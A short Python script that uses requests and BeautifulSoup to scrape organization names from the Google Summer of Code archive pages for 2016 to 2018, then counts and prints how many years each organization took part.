```python
import requests
from bs4 import BeautifulSoup as bsp
def foo(link):
    res = requests.get(link)
    ele = bsp(res.content,'html.parser')
    return [x.text for x in ele.findAll('h4',\
            attrs={'class':'organization-card__name font-black-54'})]

s16 = set(foo("https://summerofcode.withgoogle.com/archive/2016/organizations/"))
s17 = set(foo("https://summerofcode.withgoogle.com/archive/2017/organizations/"))
s18 = set(foo("https://summerofcode.withgoogle.com/archive/2018/organizations/"))
al = {}
for s in s16:
    if s not in al.keys():
        al[s] = 1
    else:
        al[s] += 1
for s in s17:
    if s not in al.keys():
        al[s] = 1
    else:
        al[s] += 1
for s in s18:
    if s not in al.keys():
        al[s] = 1
    else:
        al[s] += 1
final_list = s16.intersection(s17.intersection(s18))

# print(final_list)
srt = sorted([(k,v) for k,v in al.items()],key=lambda x:x[1],reverse=True)
for sss in srt:
    print(sss)
```
